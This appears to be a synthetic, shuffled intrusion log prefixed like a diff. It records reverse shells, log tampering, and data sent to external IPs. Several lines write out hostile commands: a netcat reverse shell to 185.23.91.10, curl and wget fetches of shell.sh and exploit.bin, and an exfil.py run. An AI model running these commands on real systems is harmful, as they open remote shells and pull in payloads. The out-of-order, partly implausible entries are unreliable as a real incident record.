+2024-08-15 02:06:30 [ERROR] Unauthorized access attempt on /admin/internal/reporting
+2024-08-15 01:53:20 [INFO] System shutdown requested by admin
+2024-08-15 01:33:25 [INFO] Reverse shell connection initiated
+2024-08-15 01:46:54 [INFO] Data transferred: 1.5MB to 203.0.113.50
+2024-08-15 02:07:10 [WARN] Elevated privileges used on /root/.bash_history
+2024-08-15 02:47:44 [INFO] Connection established to external IP 185.23.91.10
+2024-08-15 02:21:00 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 02:21:12 [ERROR] Unauthorized access attempt on /root/.bash_history
+2024-08-15 02:55:19 [WARN] Elevated privileges used on /admin/internal/reporting
+2024-08-15 02:28:24 [INFO] Data transferred: 3.5MB to 8.8.8.8
+2024-08-15 02:28:37 [INFO] Authenticated user: jdoe from IP 192.168.1.44
+2024-08-15 01:47:50 [INFO] Authenticated user: svc_invoices from IP 185.23.91.11
+2024-08-15 01:54:48 [INFO] Process started: /usr/bin/curl
+2024-08-15 03:17:20 [INFO] Command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 02:57:01 [INFO] Authenticated user: svc_invoices from IP 185.23.91.11
+2024-08-15 02:50:24 [ERROR] Log tampering detected
+2024-08-15 02:50:40 [INFO] File downloaded to /var/log/auth.log
+2024-08-15 03:11:44 [INFO] Command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 02:16:27 [WARN] Elevated privileges used on /tmp/tmpx837sh.sh
+2024-08-15 02:09:40 [INFO] Process started: /usr/sbin/sshd
+2024-08-15 02:30:47 [WARN] Suspicious command executed: bash /tmp/install.sh
+2024-08-15 01:49:00 [ERROR] Unauthorized access attempt on /var/log/auth.log
+2024-08-15 02:38:14 [INFO] File downloaded to /admin/internal/reporting
+2024-08-15 02:52:32 [INFO] Reverse shell connection initiated
+2024-08-15 02:38:42 [INFO] System shutdown requested by jdoe
+2024-08-15 02:24:48 [INFO] System shutdown requested by svc_invoices
+2024-08-15 02:25:00 [WARN] Elevated privileges used on /admin/internal/reporting
+2024-08-15 02:46:30 [INFO] Command executed: bash /tmp/install.sh
+2024-08-15 02:18:17 [ERROR] Log tampering detected
+2024-08-15 02:47:00 [INFO] Reverse shell connection initiated
+2024-08-15 02:25:48 [INFO] File downloaded to /admin/internal/reporting
+2024-08-15 02:54:40 [WARN] Suspicious command executed: /usr/bin/python3 exfil.py
+2024-08-15 01:57:28 [INFO] Command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 02:26:24 [WARN] Suspicious command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 01:50:31 [WARN] Suspicious command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 03:02:58 [INFO] Data transferred: 1.7MB to 10.10.1.3
+2024-08-15 01:50:45 [INFO] Connection established to external IP 10.10.1.3
+2024-08-15 02:49:00 [INFO] Command executed: /usr/bin/python3 exfil.py
+2024-08-15 01:50:59 [WARN] Elevated privileges used on /var/log/auth.log
+2024-08-15 01:43:48 [ERROR] Unauthorized access attempt on /home/admin/.ssh
+2024-08-15 02:35:07 [INFO] Authenticated user: svc_invoices from IP 192.168.1.43
+2024-08-15 02:20:40 [ERROR] Log tampering detected
+2024-08-15 02:35:33 [ERROR] Unauthorized access attempt on /home/admin/.ssh
+2024-08-15 03:05:14 [ERROR] Log tampering detected
+2024-08-15 03:12:54 [INFO] Command executed: bash /tmp/install.sh
+2024-08-15 01:51:48 [INFO] Authenticated user: unknown from IP 192.168.1.36
+2024-08-15 03:13:30 [INFO] Authenticated user: svc_invoices from IP 192.168.1.24
+2024-08-15 03:21:14 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 02:21:57 [INFO] Command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 02:07:12 [INFO] Authenticated user: jdoe from IP 192.168.1.14
+2024-08-15 02:59:44 [INFO] System shutdown requested by svc_logs
+2024-08-15 02:07:30 [INFO] Command executed: bash /tmp/install.sh
+2024-08-15 02:15:10 [INFO] System shutdown requested by admin
+2024-08-15 02:07:48 [ERROR] Log tampering detected
+2024-08-15 02:23:03 [ERROR] Log tampering detected
+2024-08-15 02:15:40 [INFO] System shutdown requested by jdoe
+2024-08-15 02:46:10 [INFO] Connection established to external IP 8.8.8.8
+2024-08-15 02:16:00 [WARN] Elevated privileges used on /root/.bash_history
+2024-08-15 03:17:06 [INFO] Command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 03:32:40 [ERROR] Log tampering detected
+2024-08-15 03:02:24 [INFO] Data transferred: 1.3MB to 203.0.113.50
+2024-08-15 01:53:40 [WARN] Elevated privileges used on /root/.bash_history
+2024-08-15 03:33:40 [ERROR] Log tampering detected
+2024-08-15 01:46:12 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 02:48:02 [WARN] Elevated privileges used on /var/log/auth.log
+2024-08-15 02:48:16 [INFO] System shutdown requested by unknown
+2024-08-15 03:04:00 [WARN] Elevated privileges used on /admin/internal/reporting
+2024-08-15 02:56:30 [INFO] Data transferred: 5.2MB to 8.8.8.8
+2024-08-15 02:02:16 [ERROR] Log tampering detected
+2024-08-15 02:18:00 [INFO] Authenticated user: svc_logs from IP 10.0.0.7
+2024-08-15 03:36:20 [INFO] Reverse shell connection initiated
+2024-08-15 03:36:40 [INFO] File downloaded to /root/.bash_history
+2024-08-15 01:39:15 [INFO] Data transferred: 5.0MB to 203.0.113.50
+2024-08-15 02:02:56 [INFO] Command executed: bash /tmp/install.sh
+2024-08-15 02:18:50 [WARN] Suspicious command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 03:14:18 [INFO] Data transferred: 3.1MB to 10.10.1.3
+2024-08-15 02:19:10 [INFO] Reverse shell connection initiated
+2024-08-15 02:03:28 [INFO] Reverse shell connection initiated
+2024-08-15 02:03:36 [INFO] File downloaded to /tmp/tmpx837sh.sh
+2024-08-15 02:11:42 [WARN] Suspicious command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 03:15:43 [INFO] Reverse shell connection initiated
+2024-08-15 03:24:00 [INFO] Reverse shell connection initiated
+2024-08-15 02:28:11 [INFO] Process started: /usr/bin/python3 exfil.py
+2024-08-15 01:40:10 [INFO] System shutdown requested by svc_invoices
+2024-08-15 03:00:45 [ERROR] Log tampering detected
+2024-08-15 03:01:00 [WARN] Suspicious command executed: bash /tmp/install.sh
+2024-08-15 02:37:00 [ERROR] Log tampering detected
+2024-08-15 02:29:06 [INFO] Authenticated user: admin from IP 192.168.1.41
+2024-08-15 02:29:17 [INFO] Data transferred: 1.5MB to 8.8.8.8
+2024-08-15 01:40:40 [INFO] Data transferred: 4.1MB to 10.10.1.3
+2024-08-15 02:05:12 [INFO] Data transferred: 5.1MB to 10.10.1.3
+2024-08-15 02:54:20 [ERROR] Unauthorized access attempt on /var/log/auth.log
+2024-08-15 01:57:17 [INFO] File downloaded to /home/admin/.ssh
+2024-08-15 02:38:24 [INFO] System shutdown requested by jdoe
+2024-08-15 03:44:20 [INFO] Connection established to external IP 185.23.91.10
+2024-08-15 03:28:12 [INFO] Reverse shell connection initiated
+2024-08-15 02:47:15 [INFO] Authenticated user: jdoe from IP 185.23.91.13
+2024-08-15 02:06:08 [INFO] Command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 03:04:15 [INFO] Connection established to external IP 10.10.1.3
+2024-08-15 02:56:12 [INFO] Authenticated user: jdoe from IP 192.168.1.47
+2024-08-15 01:49:54 [ERROR] Log tampering detected
